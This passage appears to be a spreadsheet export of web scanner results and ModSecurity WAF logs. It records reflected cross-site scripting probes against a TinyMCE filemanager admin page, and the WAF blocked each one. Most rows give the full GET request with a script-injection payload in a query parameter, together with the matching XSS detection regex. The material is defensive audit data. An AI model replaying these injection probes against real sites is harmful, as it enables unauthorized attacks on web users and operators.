&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(219499)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=b37oilp16kmi28kbjjvt1dipv6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:47</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:46 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(219499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsfqwQAW0AAHhB768AAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsfqwQAW0AAHhB768AAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366765</td><td class=xl24 width=64 >2015-03-31 18:50:24</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(897299)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=ggentia5esisr7iampgimjtih4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:49</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:47 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(897299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsf6wQAW0AABt@bVYAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsf6wQAW0AABt@bVYAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366766</td><td class=xl24 width=64 >2015-03-31 18:50:45</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=&quot;&gt;&lt;script&gt;alert(726899)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=4lr6o29pkp87mltjq00394iv17
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:50</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:49 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(726899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsgawQAW0AAHchlU4AAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsgawQAW0AAHchlU4AAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366767</td><td class=xl24 width=64 >2015-03-31 18:52:09</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(364699)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=0v4ro1naumc9eepp2qcvoqq4r5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:51</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:50 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(364699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsgqwQAW0AAHgzv0AAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsgqwQAW0AAHgzv0AAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366768</td><td class=xl24 width=64 >2015-03-31 18:52:30</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&quot;&gt;&lt;script&gt;alert(718899)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=nhdnj2ac8q8ikpagsesmojl2n6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:53</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:51 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(718899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsg6wQAW0AAB7zKM0AAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsg6wQAW0AAB7zKM0AAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366769</td><td class=xl24 width=64 >2015-03-31 18:53:53</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=&quot;&gt;&lt;script&gt;alert(282499)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=svefbmha1fk30ejhadva27kkq4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:54</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:53 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(282499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtshawQAW0AAHhGMtYAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtshawQAW0AAHhGMtYAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366770</td><td class=xl24 width=64 >2015-03-31 18:54:13</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(539699)&lt;/script&gt;&lt;!--&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=o4kurlkeg840areha4cne4kmh3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:55</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:54 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(539699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtshqwQAW0AAHzDqrwAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtshqwQAW0AAHzDqrwAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366771</td><td class=xl24 width=64 >2015-03-31 18:55:38</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=&quot;&gt;&lt;script&gt;alert(420399)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=rlpva4ij010jdgcmcansrt9hk4
Connection: Close

